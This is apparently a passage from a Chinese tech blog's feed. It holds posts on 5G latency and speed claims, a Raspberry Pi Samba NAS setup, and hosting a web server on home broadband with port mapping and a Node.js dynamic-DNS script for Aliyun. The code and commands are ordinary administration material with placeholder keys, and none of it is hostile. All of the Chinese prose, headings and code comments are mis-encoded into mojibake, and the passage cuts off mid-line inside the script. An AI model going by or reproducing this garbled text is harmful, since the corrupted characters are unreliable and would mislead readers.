        <content type="html"><![CDATA[<h2 id="å¯¹5Gçš„ä¸€äº›çœ‹æ³•"><a href="#å¯¹5Gçš„ä¸€äº›çœ‹æ³•" class="headerlink" title="å¯¹5Gçš„ä¸€äº›çœ‹æ³•"></a>å¯¹5Gçš„ä¸€äº›çœ‹æ³•</h2><p>5Gï¼ˆ5th-Generationï¼‰æ˜¯ç¬¬äº”ä»£<strong>ç§»åŠ¨</strong>é€šä¿¡æŠ€æœ¯çš„æ„æ€ï¼Œç›¸æ¯”4Gå®ƒæœ‰æ›´ä½çš„å»¶æ—¶å’Œæ›´å¿«çš„é€Ÿåº¦ã€‚</p><ol><li><p>ä½å»¶æ—¶</p><p> æˆ‘ä»¬å¸¸å¬åˆ°5Gå¯ä»¥æŠŠå»¶æ—¶é™ä½åˆ°<code>1ms</code>ï¼Œè¿™å¥è¯å¾ˆæœ‰è¯¯å¯¼æ€§ã€‚ä¼šè®©å¤§éƒ¨åˆ†äººè§‰å¾—ç«¯åˆ°ç«¯çš„å»¶è¿Ÿåœ¨5Gæ—¶ä»£åªæœ‰<code>1ms</code>äº†ï¼Œè¿™å…¶å®æ˜¯ä¸å‡†ç¡®çš„ã€‚è¿™ä¸ª<code>1ms</code>å…¶å®æŒ‡çš„æ˜¯ä»è®¾å¤‡åˆ°<code>5G</code>åŸºç«™çš„å»¶æ—¶ï¼Œå¹¶ä¸æ˜¯ç«¯åˆ°ç«¯çš„å»¶æ—¶ã€‚æ¢ä¸ªè§’åº¦æƒ³ï¼Œ<code>5G</code>åŸºç«™è¿˜æ˜¯è¦é€šè¿‡å…‰çº¤ç½‘ç»œæ¥å…¥äº’è”ç½‘çš„ï¼Œé‚£ä¹ˆå®ƒå°±ä¸å¯èƒ½æ¯”å…‰çº¤å»¶æ—¶æ›´ä½äº†ã€‚ç°åœ¨å…‰çº¤ç½‘ç»œçš„å»¶æ—¶é€šå¸¸è¿œè¿œå¤§äº<code>1ms</code>ï¼Œè¿™ä¸»è¦å–å†³äºè·ç¦»ã€‚</p></li><li><p>æ›´å¿«çš„é€Ÿåº¦</p><p> ç§»åŠ¨ç½‘ç»œé€Ÿåº¦æ¯ä¸€ä»£éƒ½æ¯”ä¸Šä¸€ä»£æœ‰å¾ˆå¤§çš„æå‡ã€‚æœ€æ–°åœ¨ç½‘ç»œä¸Šçœ‹åˆ°çš„ä¸€äº›æµ‹è¯•ï¼Œåœ¨<code>5G</code>ç½‘ç»œä¸­ä¸‹è½½é€Ÿåº¦èƒ½åˆ°è¾¾<code>900Mbps</code>ï¼Œçº¦ä¸º<code>110MB/s</code>å·¦å³ã€‚</p></li></ol><h3 id="5Gå¸¦æ¥çš„å½±å“"><a href="#5Gå¸¦æ¥çš„å½±å“" class="headerlink" title="5Gå¸¦æ¥çš„å½±å“"></a>5Gå¸¦æ¥çš„å½±å“</h3><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹ç½‘ä¸Šå¸¸è¯´çš„5Gå¯¹æœªæ¥ç”Ÿæ´»çš„å½±å“ï¼Œæ¥ä¸€ä¸€åˆ†æä¸€ä¸‹ã€‚</p><ol><li><p>ä¸‡ç‰©äº’è”</p><p> æˆ‘è§‰å¾—è¿™ä¸»è¦è¿™ä¸»è¦å¾—ç›Šäº5Gåæ•´ä½“å¸¦å®½çš„æå‡ï¼Œå„ç§è®¾å¤‡è¦ä¼ è¾“å¤§é‡çš„æ•°æ®ã€‚ä½å»¶æ—¶å¯¹äºè¿™æ–¹é¢çš„æå‡å¹¶ä¸ä¼šæ˜æ˜¾ã€‚ä¼´éšç€ä¸‡ç‰©äº’è”IPV6å¯èƒ½ä¼šè¿æ¥å‘å±•ã€‚ç°æœ‰ç½‘ç»œç¯å¢ƒä¸‹æˆ‘ä»¬é€šè¿‡<code>NAT</code>æŠ€æœ¯ç¼“è§£äº†<code>IPV4</code>ä¸å¤Ÿç”¨çš„é—®é¢˜ï¼Œè¿™ä¹Ÿå¯¼è‡´äº†<code>IPV6</code>è¿™ä¹ˆå¤šå¹´æ¥å‘å±•ååˆ†ç¼“æ…¢ã€‚åœ¨<code>5G</code>æ—¶ä»£å¯èƒ½ä¼šæœ‰æ›´å¤šçš„è®¾å¤‡ï¼Œä¼ æ„Ÿå™¨é€šè¿‡<code>5G</code>ç½‘ç»œæ¥å…¥äº’è”ç½‘ï¼Œé‚£å°±éœ€è¦å¤§é‡IPäº†ã€‚</p></li><li><p>è‡ªåŠ¨é©¾é©¶</p><p> <code>5G</code>å¯¹äºè‡ªåŠ¨é©¾é©¶çš„å½±å“å¯èƒ½ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œè‡ªåŠ¨é©¾é©¶å¹¶ä¸æ˜¯å°†æ•°æ®ä¼ è¾“åˆ°æœåŠ¡å™¨è®¡ç®—çš„ï¼Œå®ƒæ˜¯æœ¬åœ°è®¡ç®—çš„ã€‚è‡ªåŠ¨é©¾é©¶æ›´å¤§çš„éš¾ç‚¹å¯èƒ½è¿˜æ˜¯ç°æœ‰é“è·¯è§„åˆ™éƒ½æ˜¯ä¸ºæœ‰äººé©¾é©¶è®¾è®¡çš„ï¼Œè‡ªåŠ¨é©¾é©¶åªèƒ½å»é€‚åº”ç°æœ‰è§„åˆ™ã€‚æœ‰äº†æ›´é«˜çš„ç½‘é€Ÿï¼Œåœ¨é“è·¯ä¸Šåœç•™ä¸€ä¸ªå¤šå°æ—¶ä¸‹è½½æ›´æ–°åŒ…çš„å°´å°¬æƒ…å†µèµ·ç ä¸ä¼šå†å‡ºç°äº†â•®(â•¯_â•°)â•­ ä½†æ˜¯å¦‚æœæ±½è½¦é—´ä»¥åè¦äº’ç›¸é€šä¿¡ï¼Œé‚£ä¹ˆä½å»¶æ—¶æŠ€æœ¯å¯èƒ½ä¼šæœ‰å¸®åŠ©ã€‚</p></li><li><p>è¿œç¨‹åŒ»ç–—</p><p> æˆ‘è§‰å¾—<code>5G</code>å¯¹äºè¿œç¨‹åŒ»ç–—çš„å½±å“æˆ‘è§‰å¾—æå…¶æœ‰é™ã€‚è¿œç¨‹åŒ»ç–—éå¸¸ä¾èµ–äºä½å»¶æ—¶ï¼Œä½†æ˜¯5Gåœ¨ä½å»¶æ—¶å’Œç¨³å®šæ€§æ–¹é¢éƒ½ä¸ä¼šæ¯”ç›´æ¥ä½¿ç”¨å…‰çº¤ç½‘ç»œæ›´å¥½ã€‚æ‰‹æœ¯è®¾å¤‡å®Œå…¨å¯ä»¥æ¥å…¥ç°æœ‰å…‰çº¤ç½‘ç»œï¼Œé€šè¿‡5Gæ¥å…¥å®Œå…¨æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚æœ‰äººè¯´å¯¹äºåè¿œåœ°åŒºå…‰çº¤ä¸å¥½é“ºè®¾ï¼Œè¿™æ—¶å€™ä½¿ç”¨5Gå°±å¾ˆæ–¹ä¾¿äº†ã€‚è¿™ç§è§‚ç‚¹å…¶å®ä¹Ÿæœ‰é—®é¢˜ï¼Œ5Gç½‘ç»œçš„è¦†ç›–éå¸¸å°ã€‚åªæœ‰å‡ ç™¾ç±³ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½æœç´¢åˆ°5Gä¿¡å·çš„åœ°æ–¹éƒ½æœ€è¿‘çš„å…‰çº¤ç½‘ç»œä¹Ÿåªæœ‰å‡ ç™¾ç±³ã€‚</p></li><li><p>äº‘</p><p> äº‘å­˜å‚¨ä¼šè¿æ¥å¤§å‘å±•ã€‚<code>5G</code>æ—¶ä»£å¦‚æœæˆ‘ä»¬ä¸‹è½½é€Ÿåº¦èƒ½è¾¾åˆ°<code>100+MB/s</code>ï¼Œ<code>iCloud</code>ç±»çš„æœåŠ¡å°†ä¼šè¿æ¥æ›´å¤§å‘å±•ã€‚æˆ‘ä»¬çš„è®¾å¤‡å®Œå…¨æ²¡å¿…è¦å¾ˆå¤§çš„å­˜å‚¨äº†ï¼Œæˆ‘ä»¬ä¸éœ€è¦æŠŠæ•°æ®éƒ½å­˜åœ¨æœ¬åœ°ã€‚128Gã€256Gç”šè‡³æ›´å¤§å®¹é‡çš„æ‰‹æœºå¯èƒ½ä¼šå¾ˆå°‘äº†ã€‚</p><p> äº‘æ“ä½œç³»ç»Ÿã€äº‘æ¸¸æˆå¯èƒ½ä¼šè¿æ¥å‘å±•çš„æœºä¼šã€‚å¯¹äºå»¶æ—¶ä¸é«˜çš„æ“ä½œå®Œå…¨å¯ä»¥å†äº‘æœåŠ¡å™¨ä¸Šå®Œæˆï¼Œæˆ‘ä»¬çš„è®¾å¤‡ä¸åœ¨éœ€è¦å¼ºå¤§çš„ç¡¬ä»¶ã€‚Chromebookç±»ä¼¼çš„è®¾å¤‡å’ŒGoogle Stadiaç±»ä¼¼çš„äº‘æ¸¸æˆå¹³å°å¯èƒ½ä¼šæœ‰æ›´å¤šã€‚</p></li></ol><p>æˆ‘è§‰å¾—5Gå¯¹æˆ‘ä»¬å½±å“æœ€å¤§çš„è¿˜æ˜¯æ›´å¿«çš„ç½‘é€Ÿï¼Œè¿™å°†æå¤§æå‡æ•ˆç‡ï¼Œä¸ºæˆ‘ä»¬ç”Ÿæ´»å¸¦æ¥æ›´å¤šçš„ä¾¿åˆ©ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®¶ç”¨NASæ­å»º</title>
      <link href="/post/network-attached-storage.html"/>
      <url>/post/network-attached-storage.html</url>
      
        <content type="html"><![CDATA[<h2 id="å®¶ç”¨NASæ­å»º"><a href="#å®¶ç”¨NASæ­å»º" class="headerlink" title="å®¶ç”¨NASæ­å»º"></a>å®¶ç”¨NASæ­å»º</h2><p>æ‰‹é‡Œæœ‰ä¸€ä¸ªæ ‘è“æ´¾ï¼Œåˆšå¥½æœ‰å‡ å¼ é—²ç½®çš„SDå¡ã€‚é—²æ¥æ²¡äº‹æ­å»ºä¸ª<code>NAS</code>ï¼ˆNetwork Attached Storageï¼‰æœåŠ¡ã€‚ä½¿ç”¨æ ‘è“æ´¾æ­å»º<code>NAS</code>æœåŠ¡ä¼˜ç‚¹å°±æ˜¯çœç”µï¼Œç¼ºç‚¹æ˜¯ç½‘å¡æœ‰ç‚¹å·®ã€‚</p><h3 id="éƒ¨ç½²åŠé…ç½®"><a href="#éƒ¨ç½²åŠé…ç½®" class="headerlink" title="éƒ¨ç½²åŠé…ç½®"></a>éƒ¨ç½²åŠé…ç½®</h3><ol><li><p>å®‰è£…<code>samba</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get install samba samba-common-bin</span></span><br></pre></td></tr></table></figure></li><li><p>é…ç½®</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/samba/smb.conf</span></span><br></pre></td></tr></table></figure><p> æ‰¾åˆ°<code>Share Definitions</code>éƒ¨åˆ†åœ¨åé¢é…ç½®å…±äº«ç›®å½•</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># [å…±äº«å] </span><br><span class="line">[ytdl]</span><br><span class="line">    comment = share # å…±äº«æè¿°</span><br><span class="line">    path = /data/share/  # å…±äº«ç›®å½•</span><br><span class="line">    valid users = pi # å…è®¸è®¿é—®è¯¥å…±äº«çš„ç”¨æˆ· å¤šä¸ªç”¨æˆ·é€—å·åˆ†éš”</span><br><span class="line">    browseable = yes # è¯¥æŒ‡å®šå…±äº«ç›®å½•å¯æµè§ˆ</span><br><span class="line">    public = no # å…è®¸guestç”¨æˆ·è®¿é—®</span><br><span class="line">    writable = yes # å…è®¸å¯å†™</span><br></pre></td></tr></table></figure><blockquote><p>é…ç½®å®Œæˆé‡å¯æœåŠ¡å™¨å³å¯</p></blockquote></li><li><p>æ·»åŠ ç”¨æˆ·</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbpasswd -a [user]</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ®æç¤ºè¾“å…¥å¯†ç å³å¯</p></blockquote></li><li><p>å¯åŠ¨å’Œåœæ­¢</p><ul><li>å¯åŠ¨ï¼š&#x2F;etc&#x2F;init.d&#x2F;samba restart</li><li>åœæ­¢ï¼š&#x2F;etc&#x2F;init.d&#x2F;samba stop</li><li>é‡å¯ï¼š&#x2F;etc&#x2F;init.d&#x2F;samba restart</li><li>é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;init.d&#x2F;samba reload</li></ul></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.jianshu.com/p/ead92b06318e">åœ¨æ ‘è“æ´¾ä¸Šå®‰è£…Sambaå®ç°æ ‘è“æ´¾ä¸Windowsé—´çš„æ–‡ä»¶å…±äº«</a></li><li><a href="https://blog.csdn.net/weixin_40806910/article/details/81917077">Linux sambaçš„é…ç½®å’Œä½¿ç”¨</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨å®¶åº­å®½å¸¦éƒ¨ç½²WebæœåŠ¡å™¨</title>
      <link href="/post/deploy-web-server-on-home-broadband.html"/>
      <url>/post/deploy-web-server-on-home-broadband.html</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨å®¶åº­å®½å¸¦éƒ¨ç½²WebæœåŠ¡å™¨"><a href="#åœ¨å®¶åº­å®½å¸¦éƒ¨ç½²WebæœåŠ¡å™¨" class="headerlink" title="åœ¨å®¶åº­å®½å¸¦éƒ¨ç½²WebæœåŠ¡å™¨"></a>åœ¨å®¶åº­å®½å¸¦éƒ¨ç½²WebæœåŠ¡å™¨</h2><h3 id="ç«¯å£æ˜ å°„"><a href="#ç«¯å£æ˜ å°„" class="headerlink" title="ç«¯å£æ˜ å°„"></a>ç«¯å£æ˜ å°„</h3><p>å±€åŸŸç½‘åˆ°å…¬ç½‘è¦ç»è¿‡ä¸€å±‚netåœ°å€è½¬æ¢ï¼Œåœ¨è·¯ç”±å™¨ä¸­æœ‰ä¸€å¼ è¡¨è®°å½•ç€ï¼š</p><table><thead><tr><th>å†…ç½‘ç«¯å£</th><th>æœåŠ¡å™¨IP</th><th>æœåŠ¡å™¨ç«¯å£</th></tr></thead><tbody><tr><td>80</td><td>192.168.1.10</td><td>80</td></tr></tbody></table><p>æˆ‘ä»¬è¦æ­å»ºWebæœåŠ¡å™¨å°±éœ€è¦æŠŠ80ç«¯å£é…ç½®åˆ°è¿™å¼ è¡¨ä¸­ï¼Œ</p><blockquote><p>æ³¨æ„ï¼šåŒ—äº¬åœ°åŒºå®¶åº­å®½å¸¦80ç«¯å£è¢«å°ï¼Œå¯ä»¥ä½¿ç”¨HTTPS443ç«¯å£ã€‚</p></blockquote><p>éšç€è¿™äº›å¹´å®½å¸¦æé€Ÿä»¥åŠå„ç§ç›´æ’­ç±»çš„éœ€æ±‚ç°åœ¨å®¶åº­å®½å¸¦ä¸Šè¡Œé€Ÿåº¦å·²ç»ä¸æ˜¯é—®é¢˜ã€‚</p><h3 id="åŠ¨æ€åŸŸåè§£æ"><a href="#åŠ¨æ€åŸŸåè§£æ" class="headerlink" title="åŠ¨æ€åŸŸåè§£æ"></a>åŠ¨æ€åŸŸåè§£æ</h3><p>å®¶åº­å®½å¸¦æœ‰ä¸ªç‰¹ç‚¹ä¸æ˜¯å›ºå®šIPï¼Œæ¯æ¬¡é‡æ–°æ‹¨å·å°±ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„IPã€‚è¿™å°±è¦ä½¿ç”¨åŠ¨æ€åŸŸåè§£ææœåŠ¡äº†ï¼ŒåƒèŠ±ç”Ÿå£³ä¹‹ç±»çš„è½¯ä»¶ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åŸºäºé˜¿é‡Œäº‘æä¾›çš„<a href="https://help.aliyun.com/document_detail/29739.html">DNS API</a>è‡ªå·±æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ï¼š</p><figure class="highlight js"><figcaption><span>ddns.js</span><a href="/downloads/code/ddns.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stringCompare = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">localeCompare</span>;</span><br><span class="line"><span class="keyword">const</span> padStart = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">padStart</span>;</span><br><span class="line"><span class="keyword">const</span> padEnd = <span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">padEnd</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// accesskeys è®¿é—®&lt;https://ram.console.aliyun.com/#/user/list&gt;ç”³è¯·</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ACCESS_KEY_ID</span> = <span class="string">&#x27;YOUR_ACCESS_KEY_ID&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ACCESS_KEY_SECRET</span> = <span class="string">&#x27;YOUR_ACCESS_KEY_SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ¯”è¾ƒå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * String.prototype.localeCompare ç®—æ³•æœ‰é—®é¢˜ AA &gt; Aa </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str1</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str2</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">compareString</span>(<span class="params">str1, str2</span>) {</span><br><span class="line">    <span class="keyword">const</span> len1 = str1.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">const</span> len2 = str2.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">const</span> lim = <span class="title class_">Math</span>.<span class="title function_">min</span>(len1, len2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> str1codes = str1.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> char.<span class="title function_">codePointAt</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">const</span> str2codes = str2.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> char.<span class="title function_">codePointAt</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> k = <span class="number">0</span>, c1, c2;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; lim) {</span><br><span class="line">        c1 = str1codes[k];</span><br><span class="line">        c2 = str2codes[k];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c1 !== c2) {</span><br><span class="line">            <span class="keyword">return</span> c1 - c2;</span><br><span class="line">        }</span><br><span class="line">        k++;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> len1 - len2;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sha1</span>(<span class="params">str, key</span>) {</span><br><span class="line">    <span class="keyword">return</span> crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha1&#x27;</span>, key)</span><br><span class="line">        .<span class="title function_">update</span>(str)</span><br><span class="line">        .<span class="title function_">digest</span>()</span><br><span class="line">        .<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–æ—¶é—´å­—ç¬¦ä¸² YYYY-MM-DDTHH:mm:ssZ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">date</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">utcDateFormat</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="comment">// YYYY-MM-DDTHH:mm:ss.sssZ include milliseconds</span></span><br><span class="line">    <span class="comment">// return time.toISOString().match(/^(\d{4}\-\d{2}\-\d{2}T\d{2}:\d{2}:\d{2})/)[1] + &#x27;Z&#x27;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> year = time.<span class="title function_">getUTCFullYear</span>();</span><br><span class="line">    <span class="keyword">const</span> month = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCMonth</span>() + <span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> date = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCDate</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> hours = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCHours</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> minutes = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCMinutes</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> secounds = padStart.<span class="title function_">call</span>(time.<span class="title function_">getUTCSeconds</span>(), <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">${year}</span>-<span 